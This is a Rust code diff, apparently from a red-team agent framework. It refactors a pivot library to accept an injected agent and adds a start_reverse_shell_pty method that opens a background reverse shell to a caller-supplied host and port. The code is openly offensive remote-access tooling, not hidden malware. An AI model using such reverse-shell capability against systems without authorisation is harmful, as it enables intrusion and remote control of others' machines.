@@ -22,14 +22,52 @@ use russh_sftp::client::SftpSession;
 use std::sync::Arc;
 use alloc::string::ToString;
 use eldritch_macros::eldritch_library_impl;
+#[cfg(feature = "stdlib")]
+use eldritch_libagent::agent::Agent;
 
-#[derive(Default, Debug)]
+#[derive(Default)]
 #[eldritch_library_impl(PivotLibrary)]
-pub struct StdPivotLibrary;
+pub struct StdPivotLibrary {
+    // Inject agent if available
+    #[cfg(feature = "stdlib")]
+    pub agent: Option<Arc<dyn Agent>>,
+}
+
+// Manual Debug implementation to skip Agent
+impl core::fmt::Debug for StdPivotLibrary {
+    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
+        let mut d = f.debug_struct("StdPivotLibrary");
+        #[cfg(feature = "stdlib")]
+        d.field("agent", &self.agent.is_some());
+        d.finish()
+    }
+}
+
+impl StdPivotLibrary {
+    // Constructor to allow injection
+    #[cfg(feature = "stdlib")]
+    pub fn new(agent: Option<Arc<dyn Agent>>) -> Self {
+        Self { agent }
+    }
+
+    #[cfg(not(feature = "stdlib"))]
+    pub fn new() -> Self {
+        Self {}
+    }
+}
 
 impl PivotLibrary for StdPivotLibrary {
     fn reverse_shell_pty(&self, cmd: Option<String>) -> Result<(), String> {
         reverse_shell_pty_impl::reverse_shell_pty(cmd).map_err(|e| e.to_string())
+    }
+
+    fn start_reverse_shell_pty(&self, host: String, port: i64) -> Result<i64, String> {
+        #[cfg(feature = "stdlib")]
+        if let Some(agent) = &self.agent {
+            return agent.reverse_shell(host, port);
+        }
+
+        Err("Agent context required for spawning background tasks".to_string())
     }
 
     fn ssh_exec(
